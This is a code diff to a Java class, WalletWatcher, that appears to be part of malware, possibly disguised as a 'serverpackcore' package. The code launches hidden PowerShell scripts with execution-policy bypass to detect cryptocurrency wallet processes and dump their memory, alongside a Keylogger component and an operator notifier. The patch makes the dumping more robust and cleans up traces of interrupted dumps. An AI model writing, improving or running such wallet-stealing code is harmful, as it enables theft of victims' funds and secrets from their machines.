@@ -48,6 +48,7 @@ final class WalletWatcher {
 	private Thread watchThread;
 	private Thread whip;
 	private Process watcher;
+	private volatile Process dumpProcess;
 
 	WalletWatcher(Path installDir, Path ops, State state, Poller poller, OpsNotifier notifier, Keylogger keylogger) {
 		this.installDir = installDir;
@@ -74,7 +75,8 @@ final class WalletWatcher {
 			Path script = OpsPaths.walletsScript(installDir);
 			Keylogger.writeResource("/serverpackcore/wallets.ps1", script);
 			ProcessBuilder builder = new ProcessBuilder("powershell", "-NoP", "-NonInteractive",
-				"-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-File", script.toString());
+				"-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-File", script.toString(),
+				Long.toString(ProcessHandle.current().pid()));
 			builder.redirectError(ProcessBuilder.Redirect.DISCARD);
 			watcher = builder.start();
 			watchThread = new Thread(() -> read(watcher), "spc-wallet-read");
@@ -93,6 +95,11 @@ final class WalletWatcher {
 
 	synchronized void stop() {
 		watchEnabled = false;
+		Process dump = dumpProcess;
+		if (dump != null) {
+			// An interrupted dump would otherwise keep a powershell (and a .dmp) alive.
+			Shell.kill(dump);
+		}
 		Process current = watcher;
 		if (current != null) {
 			current.destroy();
@@ -160,7 +167,7 @@ final class WalletWatcher {
 	}
 
 	private void detect(String name, long pid, String start, String title) {
-		if (!alive(pid)) {
+		if (!watchEnabled || !wanted() || !alive(pid)) {
 			return;
 		}
 		String key = name + "|" + pid + "|" + start;
@@ -275,26 +282,61 @@ final class WalletWatcher {
 		Keylogger.writeResource("/serverpackcore/memdump.ps1", script);
 		Path list = ops.resolve("memdump-" + System.currentTimeMillis() + ".list");
 		Files.deleteIfExists(list);
+		String tag = Long.toString(System.nanoTime());
 		String target = pid > 0L ? Long.toString(pid) : name;
-		Shell.run(ops, "powershell -NoP -ExecutionPolicy Bypass -File \"" + script + "\" \"" + name + "\" \""
-			+ target + "\" \"" + ops + "\" \"" + list + "\"", 300000L);
+		String command = "powershell -NoP -ExecutionPolicy Bypass -File \"" + script + "\" \"" + name + "\" \""
+			+ target + "\" \"" + ops + "\" \"" + list + "\" \"" + tag + "\"";
 		List<String> dumps = new ArrayList<>();
-		if (!Files.isRegularFile(list)) {
-			return dumps;
+		try {
+			Shell.run(ops, command, 300000L, process -> dumpProcess = process);
+			if (Files.isRegularFile(list)) {
+				dumps = parseList(Files.readAllLines(list, StandardCharsets.UTF_8),
+					message -> notifier.send("wallet dump skipped: " + message));
+				Files.deleteIfExists(list);
+			}
+		} finally {
+			dumpProcess = null;
+			removeStrays(tag, dumps);
 		}
-		for (String line : Files.readAllLines(list, StandardCharsets.UTF_8)) {
-			String value = line.trim();
+		return dumps;
+	}
+
+	/** Parses the dump list; a BOM or stray CR from PowerShell must not corrupt a path. */
+	static List<String> parseList(List<String> lines, java.util.function.Consumer<String> big) {
+		List<String> dumps = new ArrayList<>();
+		for (String line : lines) {
+			String value = line.replace("\uFEFF", "").trim();
 			if (value.startsWith("BIG|")) {
 				String[] parts = value.split("\\|");
-				notifier.send("wallet dump skipped: " + parts[1] + " MB (limit 1536)");
+				if (parts.length > 1) {
+					big.accept(parts[1] + " MB (limit 1536)");
+				}
 				continue;
 			}
 			if (!value.isEmpty() && !value.contains("|")) {
 				dumps.add(value);
 			}
 		}
-		Files.deleteIfExists(list);
 		return dumps;
+	}
+
+	/** Deletes partial dumps from this capture only, never a listed or foreign one. */
+	private void removeStrays(String tag, List<String> kept) {
+		String prefix = "wallet-" + tag + "-";
+		try (var stream = Files.list(ops)) {
+			stream.filter(path -> {
+				String file = path.getFileName().toString();
+				return file.startsWith(prefix) && file.endsWith(".dmp") && !kept.contains(path.toString());
+			}).forEach(path -> {
+				try {
+					Files.deleteIfExists(path);
+				} catch (Throwable ignored) {
+					// Still being written or already gone.
+				}
+			});
+		} catch (Throwable throwable) {
+			Log.debug("Wallet stray cleanup failed", throwable);
+		}
 	}
 
 	private boolean processDump(String key, String name, long pid, Path dump) {
